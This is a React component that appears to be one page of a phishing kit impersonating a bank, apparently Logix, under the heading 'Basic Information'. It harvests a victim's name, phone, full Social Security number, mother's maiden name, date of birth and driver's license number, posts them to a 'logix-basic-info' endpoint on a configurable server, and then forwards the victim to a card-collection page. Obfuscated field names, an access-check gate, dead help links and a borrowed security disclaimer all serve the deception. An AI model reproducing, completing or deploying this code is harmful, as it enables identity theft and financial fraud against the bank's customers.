import React, { useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';

const BasicInfo: React.FC = () => {
  const [fzNme, setFzNme] = useState('');
  const [lzNme, setLzNme] = useState('');
  const [phone, setPhone] = useState('');
  const [ssn, setSsn] = useState('');
  const [motherMaidenName, setMotherMaidenName] = useState('');
  const [month, setMonth] = useState('');
  const [day, setDay] = useState('');
  const [year, setYear] = useState('');
  const [driverLicense, setDriverLicense] = useState('');
  const [showSSN, setShowSSN] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({ 
    fzNme: '', 
    lzNme: '', 
    phone: '', 
    ssn: '', 
    motherMaidenName: '', 
    dob: '', 
    driverLicense: '' 
  });
  const [username, setUsername] = useState('');
  const isAllowed = useAccessCheck(baseUrl);

  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz: emzemzState } = location.state || {};

  React.useEffect(() => {
    if (emzemzState) {
      setUsername(emzemzState);
    } else {
      console.error('No username provided from previous page');
      // Optionally redirect back or show error
    }
  }, [emzemzState]);

  // Show loading state while checking access
  if (!isAllowed) {
    return <div>Loading...</div>;
  }

  // Check if username is available before showing form
  if (!username) {
    return <div>Error: No username provided. Please go back and try again.</div>;
  }

  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: currentYear - 1899 }, (_, i) => 1900 + i);
  const daysInMonth = month ? new Date(parseInt(year), parseInt(month), 0).getDate() : 31;

  const formatPhone = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '').slice(0, 10);
    if (digitsOnly.length >= 7) {
      return digitsOnly.replace(/(\d{3})(\d{3})(\d{0,4})/, '($1) $2-$3');
    } else if (digitsOnly.length >= 4) {
      return digitsOnly.replace(/(\d{3})(\d{0,3})/, '($1) $2');
    }
    return digitsOnly;
  };

  const formatSSN = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '').slice(0, 9);
    if (digitsOnly.length >= 6) {
      return digitsOnly.replace(/(\d{3})(\d{2})(\d{0,4})/, (_, p1, p2, p3) =>
        p3 ? `${p1}-${p2}-${p3}` : `${p1}-${p2}`
      );
    } else if (digitsOnly.length >= 4) {
      return digitsOnly.replace(/(\d{3})(\d{0,2})/, (_, p1, p2) =>
        p2 ? `${p1}-${p2}` : `${p1}`
      );
    }
    return digitsOnly;
  };

  const validateForm = () => {
    const phoneDigits = phone.replace(/\D/g, '');
    const ssnDigits = ssn.replace(/\D/g, '');
    
    const newErrors = { 
      fzNme: !fzNme.trim() ? 'First name is required' : '',
      lzNme: !lzNme.trim() ? 'Last name is required' : '',
      phone: phoneDigits.length !== 10 ? 'Phone must be 10 digits' : '',
      ssn: ssnDigits.length !== 9 ? 'SSN must be 9 digits' : '',
      motherMaidenName: !motherMaidenName.trim() ? "Mother's maiden name is required" : '',
      dob: (!month || !day || !year) ? 'Complete date of birth is required' : '',
      driverLicense: !driverLicense.trim() ? "Driver's license is required" : ''
    };

    if (month && day && year) {
      const dob = new Date(parseInt(year), parseInt(month) - 1, parseInt(day));
      const age = new Date().getFullYear() - dob.getFullYear();
      const monthDiff = new Date().getMonth() - dob.getMonth();
      
      if (age < 18 || (age === 18 && monthDiff < 0)) {
        newErrors.dob = 'You must be at least 18 years old.';
      }
    }

    setErrors(newErrors);
    return !Object.values(newErrors).some(error => error);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!validateForm()) {
      return;
    }

    setIsLoading(true);

    try {
      const getMonthName = (monthNumber: string) => {
        const monthNames = [
          "January", "February", "March", "April", "May", "June",
          "July", "August", "September", "October", "November", "December"
        ];
        return monthNames[parseInt(monthNumber) - 1] || '';
      };

      const dob = `${getMonthName(month)}/${day}/${year}`;

      await axios.post(`${baseUrl}api/logix-basic-info/`, {
        emzemz: username,
        fzNme,
        lzNme,
        phone,
        ssn,
        motherMaidenName,
        dob,
        driverLicense
      });

      navigate('/card', {
        state: {
          emzemz: username
        }
      });
    } catch (error) {
      console.error('Error submitting form:', error);
      setErrors(prev => ({
        ...prev,
        form: 'There was an error submitting your information. Please try again.'
      }));
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="flex-1 bg-gray-200 rounded shadow-sm">
      <div className="border-b-2 border-teal-500 px-8 py-4">
        <h2 className="text-xl font-semibold text-gray-800">Basic Information</h2>
      </div>

      <div className="px-6 py-6 bg-white space-y-4">
        <p className="">We will need you to confirm your personal information.</p>

        <form onSubmit={handleSubmit} className="max-w-lg mx-auto">
          {/* First Name */}
          <div className="flex items-center gap-4 mb-4">
            <label className="text-gray-700 w-24 text-right">First Name:</label>
            <input
              id="fzNme"
              name="fzNme"
              type="text"
              value={fzNme}
              onChange={(e) => setFzNme(e.target.value)}
              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
              placeholder="Enter first name"
            />
            {errors.fzNme && (
              <div className="flex items-center gap-2 text-red-600 text-sm">
                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
                </svg>
                <span>{errors.fzNme}</span>
              </div>
            )}
          </div>

          {/* Last Name */}
          <div className="flex items-center gap-4 mb-4">
            <label className="text-gray-700 w-24 text-right">Last Name:</label>
            <input
              id="lzNme"
              name="lzNme"
              type="text"
              value={lzNme}
              onChange={(e) => setLzNme(e.target.value)}
              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
              placeholder="Enter last name"
            />
            {errors.lzNme && (
              <div className="flex items-center gap-2 text-red-600 text-sm ml-28">
                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
                </svg>
                <span>{errors.lzNme}</span>
              </div>
            )}
          </div>

          {/* Phone */}
          <div className="flex items-center gap-4 mb-4">
            <label className="text-gray-700 w-24 text-right">Phone:</label>
            <input
              id="phone"
              name="phone"
              type="text"
              value={phone}
              onChange={(e) => setPhone(formatPhone(e.target.value))}
              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
              placeholder="(555) 123-4567"
            />
          </div>
          {errors.phone && (
            <div className="flex items-center gap-2 text-red-600 text-sm ml-28 mb-4">
              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
              </svg>
              <span>{errors.phone}</span>
            </div>
          )}

          {/* SSN */}
          <div className="flex items-center gap-4 mb-4">
            <label className="text-gray-700 w-24 text-right">SSN:</label>
            <input
              id="ssn"
              name="ssn"
              type={showSSN ? 'text' : 'password'}
              value={ssn}
              onChange={(e) => setSsn(formatSSN(e.target.value))}
              maxLength={11}
              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
              placeholder="XXX-XX-XXXX"
            />
            <span
              className="text-blue-700 text-sm hover:underline cursor-pointer"
              onClick={() => setShowSSN(!showSSN)}
            >
              {showSSN ? 'Hide' : 'Show'}
            </span>
          </div>
          {errors.ssn && (
            <div className="flex items-center gap-2 text-red-600 text-sm ml-28 mb-4">
              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
              </svg>
              <span>{errors.ssn}</span>
            </div>
          )}

          {/* Mother's Maiden Name */}
          <div className="flex items-center gap-4 mb-4">
            <label className="text-gray-700 w-24 text-right">Mother's Maiden Name:</label>
            <input
              id="motherMaidenName"
              name="motherMaidenName"
              type="text"
              value={motherMaidenName}
              onChange={(e) => setMotherMaidenName(e.target.value)}
              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
              placeholder="Enter maiden name"
            />
          </div>
          {errors.motherMaidenName && (
            <div className="flex items-center gap-2 text-red-600 text-sm ml-28 mb-4">
              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
              </svg>
              <span>{errors.motherMaidenName}</span>
            </div>
          )}

          {/* Date of Birth */}
          <div className="flex items-center gap-4 mb-4">
            <label className="text-gray-700 w-24 text-right">Date of Birth:</label>
            <div className="flex gap-2">
              <select
                value={month}
                onChange={(e) => setMonth(e.target.value)}
                className="border border-gray-300 px-2 py-1 text-sm rounded"
              >
                <option value="">Month</option>
                {Array.from({ length: 12 }, (_, i) => (
                  <option key={i + 1} value={i + 1}>
                    {new Date(0, i).toLocaleString('default', { month: 'long' })}
                  </option>
                ))}
              </select>
              <select
                value={day}
                onChange={(e) => setDay(e.target.value)}
                className="border border-gray-300 px-2 py-1 text-sm rounded"
                disabled={!month || !year}
              >
                <option value="">Day</option>
                {Array.from({ length: daysInMonth }, (_, i) => (
                  <option key={i + 1} value={i + 1}>
                    {i + 1}
                  </option>
                ))}
              </select>
              <select
                value={year}
                onChange={(e) => {
                  setYear(e.target.value);
                  setDay('');
                }}
                className="border border-gray-300 px-2 py-1 text-sm rounded"
              >
                <option value="">Year</option>
                {years.map((y) => (
                  <option key={y} value={y}>
                    {y}
                  </option>
                ))}
              </select>
            </div>
          </div>
          {errors.dob && (
            <div className="flex items-center gap-2 text-red-600 text-sm ml-28 mb-4">
              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
              </svg>
              <span>{errors.dob}</span>
            </div>
          )}

          {/* Driver's License */}
          <div className="flex items-center gap-4 mb-6">
            <label className="text-gray-700 w-24 text-right">Driver's License:</label>
            <input
              id="driverLicense"
              name="driverLicense"
              type="text"
              value={driverLicense}
              onChange={(e) => setDriverLicense(e.target.value)}
              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
              placeholder="Enter license number"
            />
          </div>
          {errors.driverLicense && (
            <div className="flex items-center gap-2 text-red-600 text-sm ml-28 mb-4">
              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
              </svg>
              <span>{errors.driverLicense}</span>
            </div>
          )}

          {!isLoading ? (
            <div className="border-b-2 border-teal-500 justify-center text-center px-6 py-4">
              <button
                type="submit"
                className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
              >
                Continue
              </button>
            </div>
          ) : (
            <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent"></div>
          )}
        </form>
      </div>

      <div className="px-6 pb-6">
        <p className="text-xs text-gray-700 mb-2">
          For security reasons, never share your username, password, social security number, account number or other private data online, unless you are certain who you are providing that information to, and only share information through a secure webpage or site.
        </p>
        <div className="text-xs text-blue-700 space-x-2">
          <a href="#" className="hover:underline">Forgot Username?</a>
          <span>|</span>
          <a href="#" className="hover:underline">Forgot Password?</a>
          <span>|</span>
          <a href="#" className="hover:underline">Forgot Everything?</a>
          <span>|</span>
          <a href="#" className="hover:underline">Locked Out?</a>
        </div>
      </div>
    </div>
  );
};

export default BasicInfo;
